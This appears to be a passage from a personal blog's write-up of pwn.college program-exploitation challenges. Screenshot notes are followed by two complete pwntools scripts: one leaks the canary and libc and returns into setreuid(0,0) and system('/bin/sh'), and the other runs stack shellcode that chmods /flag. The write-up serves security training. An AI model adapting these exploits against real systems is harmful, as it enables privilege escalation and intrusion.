+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772717533772-f8273460-e5ff-4880-a877-cf37841196f0.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772717731707-6d517e5d-bd39-490f-a832-5d453a887268.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772718067230-ae170ccc-88af-43ad-8516-4e398bb2d541.png" srcset="/img/loading.gif" lazyload></p>
+<p>Now, to leak libc_base_addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772718688454-8e6d323d-3df5-47cd-81b8-b4aa19253da1.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772718710503-35a3081c-8046-417d-8335-0997f85cf669.png" srcset="/img/loading.gif" lazyload></p>
+<p>Utilize puts_function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772798163408-d13bee74-1fe7-4bdb-8ad5-5b6399d4dc78.png" srcset="/img/loading.gif" lazyload></p>
+<p>We should set jail_num at rbp_0x28</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772799529338-fa4a204e-eea8-4b32-9fb5-c2b7065d759e.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772799654446-312e0961-12e5-47ee-9acc-dcf5893b4529.png" srcset="/img/loading.gif" lazyload></p>
+<p>Good, we get libc_base_addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772800375174-57813b83-094b-4906-931b-f71c423e87ef.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: context.binary =ELF(&#x27;/challenge/toddlerone-level-5-0&#x27;)<br>   ...: p=process(b&#x27;/challenge/toddlerone-level-5-0&#x27;)<br>   ...: libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>   ...: jail_num = 0x725271a4bd26531a<br>   ...: again_code = b&#x27;REPEAT&#x27;<br>   ...: payload_1 = b&#x27;k&#x27;*(0x68-0x6) +again_code<br>   ...: #leak ret_main_addr first<br>   ...: p.recvuntil(b&#x27;Payload size:&#x27;)<br>   ...: p.sendline(str(len(payload_1)).encode())<br>   ...: print(&quot;payload_1_size&quot;, str(len(payload_1)).encode())<br>   ...: p.send(payload_1)<br>   ...: p.recvuntil(again_code)<br>   ...: ret_main_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>   ...: print(&quot;main_ret_addr&quot;, hex(ret_main_addr))<br>   ...: main_base_addr = ret_main_addr - 0x22b6<br>   ...: print(&quot;main_base_addr&quot;, hex(main_base_addr))<br>   ...: #We get it! Now, is time to leak canary<br>   ...: #Obviously, we could courrupt the low value of canary<br>   ...: p.recvuntil(b&#x27;Payload size:&#x27;)<br>   ...: payload_2 = b&#x27;k&#x27;*(0x48+0x1-0x6) +again_code<br>   ...: p.sendline(str(len(payload_2)).encode())<br>   ...: print(&quot;payload_2_size&quot;, str(len(payload_2)).encode())<br>   ...: p.send(payload_2)<br>   ...: p.recvuntil(again_code)<br>   ...: canary = u64(p.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>   ...: print(&quot;canary&quot;, hex(canary))<br>   ...: #good, we get canary.<br>   ...: #Now, to leak libc_base_addr<br>   ...: challenge_addr = main_base_addr + 0x1bad<br>   ...: e = p.elf<br>   ...: e.address = main_base_addr<br>   ...: p.recvuntil(b&#x27;Payload size:&#x27;)<br>   ...: r = ROP(e)<br>   ...: r.raw(r.rdi)<br>   ...: r.raw(e.got[&#x27;puts&#x27;])<br>   ...: r.raw(e.plt[&#x27;puts&#x27;])<br>   ...: r.raw(challenge_addr)<br>   ...: payload_3 = b&#x27;k&#x27;*(0x60-0x28)+p64(jail_num)+b&#x27;k&#x27;*(0x28-0x18-0x8)+p64(canary)+b&#x27;k&#x27;*0x10+p64(0xdeadbeef)+r.chain()<br>   ...: p.sendline(str(len(payload_3)).encode())<br>   ...: p.send(payload_3)<br>   ...: print(&quot;payload_3_size&quot;, str(len(payload_3)).encode())<br>   ...: p.send(payload_3)<br>   ...: print(&quot;payload_3_size&quot;, str(len(payload_3)).encode())<br>   ...: p.recvuntil(b&quot;Goodbye!\n&quot;)<br>   ...: puts_got_addr = u64(p.recv(6).ljust(8,b&quot;\x00&quot;))<br>   ...: libc_base_addr = puts_got_addr - libc.symbols[&#x27;puts&#x27;]<br>   ...: print(&quot;libc_base_addr&quot;, hex(libc_base_addr))<br>   ...: # add ROP<br>   ...: libc.address = libc_base_addr<br>   ...: sys_addr = libc.symbols[&#x27;system&#x27;]<br>   ...: binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;))<br>   ...: setreuid_addr = libc.symbols[&#x27;setreuid&#x27;]<br>   ...: rop = ROP(libc)<br>   ...: ruid = 0<br>   ...: euid = 0<br>   ...: rop.raw(rop.rdi)<br>   ...: rop.raw(ruid)<br>   ...: rop.raw(rop.rsi)<br>   ...: rop.raw(euid)<br>   ...: rop.raw(setreuid_addr)<br>   ...: rop.raw(rop.rdi)<br>   ...: rop.raw(binsh_addr)<br>   ...: rop.raw(sys_addr)<br>   ...: #rop.raw(sys_addr)<br>   ...: payload_4 = b&#x27;k&#x27;*(0x60-0x28)+p64(jail_num)+b&#x27;k&#x27;*(0x28-0x18-0x8)+p64(canary)+b&#x27;k&#x27;*0x10+p64(0xdeadbeef)+rop.chain()<br>   ...: p.sendline(str(len(payload_4)).encode())<br>   ...: print(&quot;payload_4_size&quot;, str(len(payload_4)).encode())<br>   ...: p.send(payload_4)<br>   ...: p.interactive()<br> <br></code></pre></td></tr></table></figure>
+
+<h5 id="Containment-Composition-Hard"><a href="#Containment-Composition-Hard" class="headerlink" title="Containment Composition (Hard)"></a><font style="color:#2F8EF4;">Containment Composition (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772800896147-f2572c8b-a419-4de9-bed4-64fe361f9794.png" srcset="/img/loading.gif" lazyload></p>
+<p>where is main_function?</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772800956364-6e57db2a-0f23-4456-9008-d213581430b9.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772800976347-61f69e1e-7fa8-492f-be23-289f727d3a13.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772802579393-68541c73-9317-40c6-a598-4a693f712788.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772802598212-e8707bf1-ba6c-4ca5-96cc-37e60fbf8bb1.png" srcset="/img/loading.gif" lazyload></p>
+<p>before call __libc_start_main, the addr of main was stored in rdi</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772802939683-0daa6d5e-d6f8-4fba-ac1e-84979a336112.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772803014397-d7dd01f7-2272-4775-acac-a5bb706a6018.png" srcset="/img/loading.gif" lazyload></p>
+<p>we get libc_start_main_addr</p>
+<p>si,si,si</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772804194472-c10a8224-7d0e-40f0-89ef-0eea353f1290.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772878783536-554a9599-0a64-4117-8abe-6cf8a3742956.png" srcset="/img/loading.gif" lazyload></p>
+<p>the main_addr is stored in $rsp + 0x18</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772878964805-6f38df2d-c5d4-42b8-bccd-f4e348f7f133.png" srcset="/img/loading.gif" lazyload></p>
+<p>call main!!!</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772879147210-b4730d86-0718-4220-947c-8c1aa4aa519e.png" srcset="/img/loading.gif" lazyload></p>
+<p>we find main function</p>
+<p>Utilize ida</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772804744062-a929046f-6a34-4a25-ac3b-7cf810eacb35.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772804754541-86c9a910-5c8b-4e53-bff1-171b30a1e0ab.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772804776243-c61b31de-a6c7-41a8-bf4e-261aa129a5fc.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772879855074-bad69766-0b37-4ca1-89a9-8af5d9ddfd58.png" srcset="/img/loading.gif" lazyload></p>
+<p>All right</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772879316006-581705fe-2127-44ac-ab9d-f2d9375b1e56.png" srcset="/img/loading.gif" lazyload></p>
+<p>we find challenge function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772880509836-0505846a-3113-4e89-9545-9c1ccf9855d6.png" srcset="/img/loading.gif" lazyload></p>
+<p>canary is at rbp - 0x8</p>
+<p>where is jail_num ???</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772881189986-a01c74a5-60e3-4a76-8716-b5072d897497.png" srcset="/img/loading.gif" lazyload></p>
+<p>this is v12[12]</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772881231418-0a6a1856-62cc-44b2-af96-0f48dd433518.png" srcset="/img/loading.gif" lazyload></p>
+<p>the jail_num should currupt at v12[11]</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772881342631-32e6ef4e-f7f5-4c95-98af-aa95f7b9c648.png" srcset="/img/loading.gif" lazyload></p>
+<p>the addr in rax is rbp-0x70+0x60, v12[12] is at rbp-0x10</p>
+<p>Obviously, v12[11] is at rpb-0x18</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772881672481-5aa69083-c14b-41a9-92f6-0743dd4d4781.png" srcset="/img/loading.gif" lazyload></p>
+<p>the buf is at v12, so the buf is at rbp-0x70</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772882153418-c0ef962c-e1e7-465f-bf66-9b0f7be9a200.png" srcset="/img/loading.gif" lazyload></p>
+<p>here is jail_num </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772883278163-199389a1-21ae-42e9-bd7b-3f3963292a8e.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772883312469-a44ddf2f-2e52-4b83-9570-3bed1c402919.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772883513129-d8d3ec87-b9bf-464a-b6c8-4fd423e7a400.png" srcset="/img/loading.gif" lazyload></p>
+<p>ret to main</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772883701969-5ea8b577-48e6-498c-bf23-e05f8364feef.png" srcset="/img/loading.gif" lazyload></p>
+<p>very hard</p>
+<h5 id="Constant-Corruption-Easy"><a href="#Constant-Corruption-Easy" class="headerlink" title="Constant Corruption (Easy)"></a><font style="color:#2F8EF4;">Constant Corruption (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772884621938-72196adc-6251-4302-87e7-abb269a4ce00.png" srcset="/img/loading.gif" lazyload></p>
+<p>we have RWX right in stack, wow</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773203626081-f1fd4d81-0fc8-4b07-a1af-57012e7c5d59.png" srcset="/img/loading.gif" lazyload></p>
+<p>seccomp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773207844412-68341c44-4e33-4275-8bc7-292827f66a83.png" srcset="/img/loading.gif" lazyload></p>
+<p>we can run shellcode at stack</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773230924564-ad71dfc0-421e-4be4-bea1-380d739e424f.png" srcset="/img/loading.gif" lazyload></p>
+<p>in sandbox we can only use write and exit_group</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773208960780-afa4ffe6-0e3a-436c-b9a1-081deb450ac1.png" srcset="/img/loading.gif" lazyload></p>
+<p>if REPEAT in buf, we can pass seccomp and recall challenge</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773210747141-54429f98-9069-47ce-b1d8-7f98792b18cc.png" srcset="/img/loading.gif" lazyload></p>
+<p>canary is at rbp-0x18</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773211033219-1f549cd8-9e5f-475d-abd5-a3dbe1251446.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773211052060-f60d6a9a-bf43-43d2-b162-4cbee6aa9617.png" srcset="/img/loading.gif" lazyload></p>
+<p>the buf is at rbp-0x50</p>
+<p>we could send shellcode in buf and ret to buf to run</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773232017392-023d26fa-90bf-4043-bd6c-77ff443b0333.png" srcset="/img/loading.gif" lazyload></p>
+<p>we get canary</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773323272476-3d8d9f5c-1f52-41e2-87d9-152e42190da2.png" srcset="/img/loading.gif" lazyload></p>
+<p>the saved rbp is main’s rbp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773326910378-a13c357d-4a7b-4bb1-b390-51cd952a8663.png" srcset="/img/loading.gif" lazyload></p>
+<p>we get the offset of main’s rbp and buf</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773319659423-ef9c1f00-570d-4bc9-bf24-f2100990c7f0.png" srcset="/img/loading.gif" lazyload></p>
+<p>before pop rbp, we will pop rbx</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773327896549-1b6754ca-a88f-4008-ae7d-dbf3343ea87d.png" srcset="/img/loading.gif" lazyload></p>
+<p>the seccomp will allow 2 function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773327954560-9194174b-3648-4803-933f-9182f2d721eb.png" srcset="/img/loading.gif" lazyload></p>
+<p>the rbp-0x60 is at rbp-0x50+0x28&#x3D;rbp-0x28</p>
+<p>0x28&#x3D;40</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773328299711-e23a129f-7038-45dd-896c-a2e088c495fc.png" srcset="/img/loading.gif" lazyload></p>
+<p>well</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: context.binary =ELF(&#x27;/challenge/toddlerone-level-6-0&#x27;)<br>   ...: p=process(b&#x27;/challenge/toddlerone-level-6-0&#x27;)<br>   ...: #libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>   ...: #jail_num = 0xbe0251a35480a065<br>   ...: again_code = b&#x27;REPEAT&#x27;<br>   ...: payload_1 = b&#x27;k&#x27;*(0x50-0x6) +again_code<br>   ...: #leak ret_main_addr first<br>   ...: p.recvuntil(b&#x27;Payload size:&#x27;)<br>   ...: p.sendline(str(len(payload_1)).encode())<br>   ...: print(&quot;payload_1_size&quot;, str(len(payload_1)).encode())<br>   ...: p.send(payload_1)<br>   ...: p.recvuntil(again_code)<br>   ...: saved_rbp_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>   ...: print(&quot;saved_rbp_addr&quot;, hex(saved_rbp_addr))<br>   ...: #pause()<br>   ...: buf_addr = saved_rbp_addr - 0x11f0<br>   ...: print(&quot;buf_addr&quot;, hex(buf_addr))<br>   ...: #We get it! Now, is time to leak canary<br>   ...: p.recvuntil(b&#x27;Payload size:&#x27;)<br>   ...: payload_2 = b&#x27;k&#x27;*(0x50-0x18+0x1-0x6) +again_code<br>   ...: p.sendline(str(len(payload_2)).encode())<br>   ...: print(&quot;payload_2_size&quot;, str(len(payload_2)).encode())<br>   ...: p.send(payload_2)<br>   ...: p.recvuntil(again_code)<br>   ...: canary = u64(p.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>   ...: print(&quot;canary&quot;, hex(canary))<br>   ...: #pause()<br>   ...: #p.close()<br>   ...: shellcode = shellcraft.pushstr(&#x27;/flag&#x27;)<br>   ...: shellcode += shellcraft.syscall(&#x27;SYS_chmod&#x27;, &#x27;rsp&#x27;, 0o777)<br>   ...: shellcode = asm(shellcode)<br>   ...: #shellcode_=shellcode.ljust(0x50-0x18, b&#x27;\x90&#x27;)<br>   ...: print(&quot;shellcode_size&quot;, str(len(shellcode)).encode())<br>   ...: payload_4 = shellcode+b&#x27;\x90&#x27;+p32(90)+p32(1)+b&#x27;k&#x27;*(0x50-0x18-48)+p64(canary)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(buf_addr)<br>   ...: p.sendline(str(len(payload_4)).encode())<br>   ...: print(&quot;payload_4_size&quot;, str(len(payload_4)).encode())<br>   ...: p.send(payload_4)<br>   ...: #pause()<br>   ...: #p.close()<br>   ...: !cat /flag<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773328463662-eaa7c021-2136-48b4-ae60-ea9141af0514.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Constant-Corruption-Hard"><a href="#Constant-Corruption-Hard" class="headerlink" title="Constant Corruption (Hard)"></a><font style="color:#2F8EF4;">Constant Corruption (Hard)</font></h5><p>no function name </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773328671404-6cc4129e-0403-42e4-b42e-4cefd98f460a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773402582428-4bb9dbac-8ec2-433b-b96e-dbf6f54cfdc1.png" srcset="/img/loading.gif" lazyload></p>
+<p>main is at rsp + 0x18</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773402630710-65bc7c5b-f13d-4c38-a758-38b8705b44eb.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<p>call main</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773402803820-fd14ec15-7c9b-44b2-802d-723325cdebfe.png" srcset="/img/loading.gif" lazyload></p>
+<p>the challenge function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773403031952-8aa11143-0340-4056-a6cc-3326bf0a0056.png" srcset="/img/loading.gif" lazyload></p>
+<p>scanf size at rbp-0x90</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773403123426-ab0b0399-91cc-48f5-aa2b-58d86afc78b3.png" srcset="/img/loading.gif" lazyload></p>
+<p>read at rbp-0x88’s addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773403158117-b557e7f3-ed10-4aeb-899f-75b4dd5bd752.png" srcset="/img/loading.gif" lazyload></p>
+<p>the rbp-0x88 is pointer to rbp-0x70</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773403395676-de67385c-14bd-438f-b6cc-d64080e98d86.png" srcset="/img/loading.gif" lazyload></p>
+<p>the canary is at rbp -0x8</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773403583989-8f4ed84d-9329-4b86-8c0e-459cec9ffa1f.png" srcset="/img/loading.gif" lazyload></p>
+<p>the rule_add’s syscall_number is at rbp - 0x80</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773403673527-b5f05ecc-ea47-405a-b74e-c9011e4ddc80.png" srcset="/img/loading.gif" lazyload></p>
+<p>the rbp-0x80 is poiner to rbp-0x14</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773404619784-31717fc6-6a6d-4d4b-b259-5c70f3eaf9aa.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773404694988-bf779476-5eb3-4635-ad15-a47b1668b551.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773404766069-0e9bc74a-327a-4ab1-97f9-e0fd1cc49eef.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773404809013-6f26b057-7530-4963-98ce-23f0ef8c9700.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Return-to-YanLand-Easy"><a href="#Return-to-YanLand-Easy" class="headerlink" title="Return to YanLand (Easy)"></a><font style="color:#2F8EF4;">Return to YanLand (Easy)</font></h5><p>No asrl</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773405457332-4d785b02-b621-409a-8131-a15ec4ff700c.png" srcset="/img/loading.gif" lazyload></p>
+<p>well</p>
+<p>analyse the Yan85</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1773407003540-6523f8d1-e2b0-4782-900a-e72148fa387e.png" srcset="/img/loading.gif" lazyload></p>
+<p>we find the interpreter_loop function</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-college/" class="category-chain-item">pwn.college</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college-pro sec-_Program Explotation</div>
+      <div>https://ghostshark-pro.github.io/2026/04/23/pwn.college-pro sec-_Program Explotation/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>shark</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>License</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-pro%20sec-_Program%20Security/" title="pwn.college-pro sec-_Program Security">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn.college-pro sec-_Program Security</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-pro%20sec-_Dynamic%20Allocator%20Misuse/" title="pwn.college-pro sec-_Dynamic Allocator Misuse">
+                        <span class="hidden-mobile">pwn.college-pro sec-_Dynamic Allocator Misuse</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>TOC</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
